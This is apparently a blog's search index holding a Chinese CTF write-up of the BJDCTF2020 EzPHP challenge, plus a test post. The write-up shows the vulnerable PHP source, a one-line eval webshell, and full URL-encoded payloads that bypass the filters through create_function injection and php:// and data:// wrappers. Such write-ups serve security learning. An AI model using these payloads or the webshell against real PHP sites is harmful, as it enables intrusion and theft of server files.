<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>测试文章</title>
      <link href="/2021/09/15/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
      <url>/2021/09/15/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<p>这是一篇测试文章用于测试图片是否而可用。</p><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/15/pSd51UOeKXGmVWQ.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210915225327523"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJCTF2020-EZPHP</title>
      <link href="/2021/09/14/hello-world/"/>
      <url>/2021/09/14/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br><span class="line">This is a very simple challenge <span class="keyword">and</span> <span class="keyword">if</span> you solve it I will give you a flag. Good Luck!</span><br><span class="line">fxck you! I hate English!</span><br></pre></td></tr></table></figure><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>​    可以看到我们如果需要拿到flag就要穿过6个if。据出题人的说法，本题考察的是create_function()函数。题目我看了。看不懂。既然考察的是create_function()。知识点也在我们能力范畴之外。因此跟着出题人的WP复现了一波。</p><h3 id="核心考点：Create-function"><a href="#核心考点：Create-function" class="headerlink" title="核心考点：Create_function()"></a>核心考点：Create_function()</h3><p>用法如下。用于创建一个方法，变量名为方法名，第一个参数为新方法的形参，第二个参数为新方法的内容。</p><p><img "" class="lazyload placeholder" data-original="https://img2020.cnblogs.com/blog/2513159/202108/2513159-20210822205441764-1820785349.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210822164953858"></p><p>由于题目中我们的code是可控的，那么我们可以构造如下函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$myFunc</span> = create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return ($a+$b);&#125;eval($_POST[1]);\\&#x27;</span>)</span><br><span class="line">    <span class="comment">#如此一来执行的myFunc就变成了</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$a</span>+<span class="variable">$b</span>);&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);\\</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里可以看见我们成功嵌入了一段一句话木马。</p><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/15/mYqgNIuWMd4vi5e.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210822165828641"></p><p>​    </p><h3 id="考点1：绕过QUERY-STRING的正则匹配"><a href="#考点1：绕过QUERY-STRING的正则匹配" class="headerlink" title="考点1：绕过QUERY_STRING的正则匹配"></a>考点1：绕过QUERY_STRING的正则匹配</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br></pre></td></tr></table></figure><p>php中因为$_SERVER[‘QUERY_STRING’]不会进行urldecode，而$_GET[]会进行解码。因此我们通过urlencode绕过该正则匹配。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1:?file=</span><br></pre></td></tr></table></figure><h3 id="考点2：绕过aqua-is-cute的正则匹配"><a href="#考点2：绕过aqua-is-cute的正则匹配" class="headerlink" title="考点2：绕过aqua_is_cute的正则匹配"></a>考点2：绕过aqua_is_cute的正则匹配</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>)</span><br></pre></td></tr></table></figure><p>因为是^.+$形式的正则匹配。那么直接使用换行符%0a绕过。因为debu,auqa,cute在第一个If中。因此对他三个进行urlencode.</p><p>注意这里的%0a是用来满足debu!==aqua_is_cute。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2:debu=aqua_is_cute%<span class="number">0</span>a==&gt;%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">5</span>f%<span class="number">69</span>%<span class="number">73</span>%<span class="number">5</span>f%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><h3 id="考点3：绕过-REQUEST的字母匹配。"><a href="#考点3：绕过-REQUEST的字母匹配。" class="headerlink" title="考点3：绕过$_REQUEST的字母匹配。"></a>考点3：绕过$_REQUEST的字母匹配。</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) </span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))</span><br></pre></td></tr></table></figure><p>这里是通过数组遍历的方式，来进行正则匹配。那么我们传入的参数。</p><p>知识点是，在post和get同时存在时，request提取post数据的优先级高于get。因此我们post给file=1&amp;debu=1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:debu=aqua_is_cute%<span class="number">0</span>a&amp;file=</span><br><span class="line">urlencde:%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>=%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">5</span>f%<span class="number">69</span>%<span class="number">73</span>%<span class="number">5</span>f%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>a&amp;file=</span><br><span class="line"></span><br><span class="line">POST:file=<span class="number">1</span>&amp;debu=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="考点4：绕过文件内容读取的比较"><a href="#考点4：绕过文件内容读取的比较" class="headerlink" title="考点4：绕过文件内容读取的比较"></a>考点4：绕过文件内容读取的比较</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br></pre></td></tr></table></figure><p>因为file_get_contents的特性。我们可以考虑使用php伪协议来绕过这个点。因为debu_debu_aqua在第一个if中。所以Urlencode</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload4：    GET:debu=aqua_is_cute&amp;file=data:<span class="comment">//text/plain,base64,debu_debu_aquaurlencncode:file=data://text/plain,%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0aPOST:file=1&amp;debu=1</span></span><br></pre></td></tr></table></figure><p>data://text/plain;base64,debu_debu_aqua</p><h3 id="考点5：绕过sha1松散比较"><a href="#考点5：绕过sha1松散比较" class="headerlink" title="考点5：绕过sha1松散比较"></a>考点5：绕过sha1松散比较</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )</span><br></pre></td></tr></table></figure><p>因为sha1无法处理数组，因此我们通过数组绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload5:GET:debu=aqua_is_cute&amp;file=data:<span class="comment">//text/plain;base64,debu_debu_aqua&amp;shanap[]=1&amp;passwd[]=2urlencode:file=data://text/plain,%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6E%61[]=1&amp;%70%61%73%73%77%64[]=2POST:file=1&amp;debu=1</span></span><br></pre></td></tr></table></figure><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function:"></a>create_function:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123;     <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); &#125; <span class="keyword">else</span> &#123;     <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); &#125;</span><br></pre></td></tr></table></figure><p>​    前面都绕过了。那么我们要如何去读到这个flag呢。首先可以看到文件中有包含flag.php。那么一定存在$flag变量。</p><p>那么我们可以通过读取变量的方式.使用get_defined_vars()。再根据create_function。因为code做了很多过滤。我们可以想到用字母数字的webshell。再看题目上是$code(‘ ‘,$arg);这里我们的两个点都可控。</p><p>$code=create_function&amp;$arg=}var_dump(get_defined_vars());\</p><p>因为code,和arg都在第一个if中。所以进行urlencode</p><h2 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload:"></a>最终payload:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET:debu=aqua_is_cute&amp;file=data:<span class="comment">//text/plain;base64,debu_debu_aqua&amp;shanap[]=1&amp;passwd[]=2urlencode:file=data://text/plain,%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6E%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6C%61%67[%63%6F%64%65]=create_function&amp;%66%6C%61%67[%61%72%67]=&#125;var_dump(get_defined_vars());//POST:file=1&amp;debu=1</span></span><br></pre></td></tr></table></figure><p>​    <img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/15/Gf3J9lIarwO587x.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210822190836089"></p><p>可恶！给出了真实flag的位置1fl4g.php。那么我们继续想办法去读这个文件。</p><p>根据上面的get_defined_vars();那么很容易想到我们把这个rea1fl4g.php也包含进来。</p><p>require(rea1fl4g.php);</p><p>发现也读不到源码</p><p>原题目的预期解是这个。但是加了base64_decode来解码。因为code被Ban了。那么继续对base64_decode进行urlencode</p><p>原题目payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET:file=data:<span class="comment">//text/plain,%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6E%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6C%61%67[%63%6F%64%65]=create_function&amp;%66%6C%61%67[%61%72%67]=&#125;require(%62%61%73%65%36%34%5F%64%65%63%6F%64%65(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//POST:file=1&amp;debu=1</span></span><br></pre></td></tr></table></figure><h2 id="本题payload"><a href="#本题payload" class="headerlink" title="本题payload:"></a>本题payload:</h2><p>​    因为~没有被过滤。那么可以进行取反构造php://filter伪协议来读取flag.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=rea1fl4g.phpGET:file=data://text/plain,%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6E%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6C%61%67[%63%6F%64%65]=create_function&amp;%66%6C%61%67[%61%72%67]=&#125;require(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);//POST:file=1&amp;debu=1</span></span><br></pre></td></tr></table></figure><p>唯一一个我看得懂的非预期解：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET:file=data:<span class="comment">//text/plain,%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6E%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6C%61%67[%63%6F%64%65]=create_function&amp;%66%6C%61%67[%61%72%67]=&#125;var_dump(require(end(pos(get_defined_vars()))));//&amp;k1he=%70%68%70%3A%2F%2F%66%69%6C%74%65%72%2F%72%65%61%64%3D%63%6F%6E%76%65%72%74%2E%62%61%73%65%36%34%2D%65%6E%63%6F%64%65%2F%72%65%73%6F%75%72%63%65%3D%72%65%61%31%66%6C%34%67%2E%70%68%70POST:file=1&amp;debu=2&amp;k1he=1</span></span><br></pre></td></tr></table></figure><p>主要看这个flag[code]=}var_dump(require(end(pos(get_defined_vars()))));//</p><p>因为pos()取内部指针的首个元素，得到一个我们传参的GET数组<img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/15/VDUedwYqFmWIixS.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210822204452173"></p><p>可以看见我们在传参k1he=php伪协议以后，这个数组中有了这个东西。</p><p>然后利用end()取这个数组的最后一个数，那不就是我们的伪协议吗。</p><p>那么就等价于了一个文件包含伪协议。</p><p>又因为我们的k1he不是数组，绕不过全是字母的正则匹配。因此传参里再加一个k1he=1来绕过。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
